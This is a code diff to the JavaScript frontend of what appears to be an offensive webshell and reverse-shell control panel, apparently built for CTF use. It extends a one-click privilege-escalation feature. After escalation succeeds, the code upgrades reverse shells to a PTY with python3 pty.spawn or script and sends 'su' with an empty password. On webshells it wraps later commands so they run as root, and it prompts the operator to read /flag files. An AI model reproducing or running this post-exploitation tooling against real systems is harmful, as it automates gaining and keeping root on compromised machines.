@@ -197,9 +197,20 @@
       }
       function isApplied(id) { return S.isTtyApplied(id); }
 
-      /* ---------- 一键提权（M5-2）：采集事实 → 选最可信路径 → 直接执行 ---------- */
+      /* ---------- 一键提权（M5-2）：采集事实 → 选最可信路径 → 执行 → 验证 → 建立提权上下文 ---------- */
       const privescBusy = ref(false);
       const privescResult = ref(null);
+
+      function clearEscalation() {
+        const s = activeShell.value;
+        if (!s || !s.escalatedUser) return;
+        S.shellEscalateClear(s.id).then(() => {
+          const t = S.state.shells.find((x) => x.id === s.id);
+          if (t) t.escalatedUser = '';
+          S.termPush('dim', S.escapeHtml('[*] 已取消提权上下文（后续命令恢复原用户执行）'));
+          S.toast('已取消提权上下文', 'info');
+        });
+      }
 
       function oneClickPrivesc() {
         const s = activeShell.value;
@@ -210,7 +221,14 @@
         privescResult.value = null;
         S.termPush('warn', S.escapeHtml('[*] 一键提权：采集系统信息并匹配提权路径…'));
         scrollTerm();
-        S.privescScan(s.id).then((out) => {
+
+        /* 已有提权上下文先清掉：否则采集/验证会被包装器二次包裹 */
+        const prep = s.escalatedUser ? S.shellEscalateClear(s.id) : Promise.resolve(null);
+        if (s.escalatedUser) {
+          const t = S.state.shells.find((x) => x.id === s.id);
+          if (t) t.escalatedUser = '';
+        }
+        prep.then(() => S.privescScan(s.id)).then((out) => {
           privescBusy.value = false;
           if (!out || !out.ok) {
             const why = (out && out.error) || '未知原因';
@@ -238,6 +256,61 @@
               .forEach((l) => S.termPush(kind, S.escapeHtml(l)));
           };
 
+          /* 提权上下文：反弹会话直接 su 进交互终端；WebShell 用命令包装器 */
+          const establish = () => {
+            const esc = top.escalate || {};
+            if (!esc.user) return;
+            if (s.kind === 'reverse') {
+              /* 反弹会话要真正切到 root：su 需要控制终端，没有 PTY 先升级 */
+              const send = (data) => S.shellInput(s.id, { data: data + '\r' });
+              const caps = termState.caps || {};
+              if (!caps.tty) {
+                const up = caps.python ? "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+                  : (caps.script === false ? '' : 'script -qc /bin/bash /dev/null');
+                if (!up) {
+                  if (esc.wrapper) {
+                    S.shellEscalate(s.id, esc.user, esc.wrapper).then((r) => {
+                      const t = S.state.shells.find((x) => x.id === s.id);
+                      if (t && r) t.escalatedUser = r.escalatedUser || esc.user;
+                    });
+                    S.termPush('warn', S.escapeHtml('[*] 该会话无 PTY 且没有 python3 / script：' +
+                      '已改用命令包装器（面板发起的命令以 ' + esc.user + ' 执行），终端手敲的命令仍是原用户'));
+                    S.toast('已用包装器提权（手敲命令请用「命令速查 / 一键提权」发起）', 'warn');
+                  }
+                  return;
+                }
+                S.termPush('dim', S.escapeHtml('$ ' + up + '   （无 PTY，先升级终端）'));
+                send(up);
+                setTimeout(() => send('export TERM=xterm-256color; stty rows 40 cols 200 2>/dev/null'), 2000);
+                setTimeout(() => {
+                  S.termPush('dim', S.escapeHtml('$ su ' + esc.user + '   （空密码，直接回车）'));
+                  send('su ' + esc.user);
+                }, 3600);
+                setTimeout(() => send(''), 5200);
+              } else {
+                S.termPush('dim', S.escapeHtml('$ su ' + esc.user + '   （空密码，直接回车）'));
+                send('su ' + esc.user);
+                setTimeout(() => send(''), 1200);
+              }
+              S.shellEscalate(s.id, esc.user, '').then(() => {
+                const t = S.state.shells.find((x) => x.id === s.id);
+                if (t) t.escalatedUser = esc.user;
+              });
+              S.termPush('ok', S.escapeHtml('[*] 已在交互终端切到 ' + esc.user +
+                '（终端提示符变化即生效，退出用 exit）'));
+              S.toast('已切到 ' + esc.user + '：终端里可直接 cat /flag*', 'ok');
+              return;
+            }
+            if (!esc.wrapper) return;
+            S.shellEscalate(s.id, esc.user, esc.wrapper).then((r) => {
+              const t = S.state.shells.find((x) => x.id === s.id);
+              if (t && r) t.escalatedUser = r.escalatedUser || esc.user;
+              S.termPush('ok', S.escapeHtml('[*] 已建立提权上下文：后续命令以 ' + esc.user + ' 执行'));
+              S.toast('提权上下文已建立：后续命令以 ' + esc.user + ' 执行', 'ok');
+              scrollTerm();
+            });
+          };
+
           /* 主命令与验证必须串行：并发发请求时验证会跑在写入之前（Tomcat 并发处理） */
           S.termPush('dim', S.escapeHtml('$ ' + cmd));
           scrollTerm();
@@ -260,8 +333,8 @@
               S.termPush(okRoot ? 'ok' : 'warn', S.escapeHtml(okRoot
                 ? '✅ 提权成功：已获得 root'
                 : '⚠ 命令已执行，但未取得 root（见上方输出，可能需要交互 TTY 或换一条路径）'));
-              S.toast(okRoot ? '一键提权成功：已获得 root' : '提权命令已执行，但未取得 root',
-                okRoot ? 'ok' : 'warn');
+              if (okRoot) establish();
+              else S.toast('提权命令已执行，但未取得 root', 'warn');
               scrollTerm();
             });
           });
@@ -281,7 +354,7 @@
         openAdd, testForm, save, test, remove, heartbeatAll, latencyClass,
         fixFilter, fixes, appliedList, ttyMode, ps1,
         detectTty, applyFix, finishTty, copyFix, sendFix, isApplied, fixCmdText,
-        privescBusy, privescResult, oneClickPrivesc,
+        privescBusy, privescResult, oneClickPrivesc, clearEscalation,
       };
     },
   };
